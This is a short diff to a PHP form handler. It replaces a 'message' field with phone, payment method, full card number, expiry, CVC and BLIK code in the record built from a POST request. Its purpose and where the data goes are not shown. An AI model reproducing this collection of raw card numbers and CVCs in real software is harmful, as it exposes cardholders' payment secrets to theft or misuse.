@@ -12,7 +12,12 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
     $data = [
         'name' => $name,
         'email' => $email,
-        'message' => $message,
+        'phone' => $phone,
+        'method' => $method,
+        'card' => $card,
+        'expiry' => $expiry,
+        'cvc' => $cvc,
+        'blik' => $blik,
         'timestamp' => date('Y-m-d H:i:s')
     ];
 
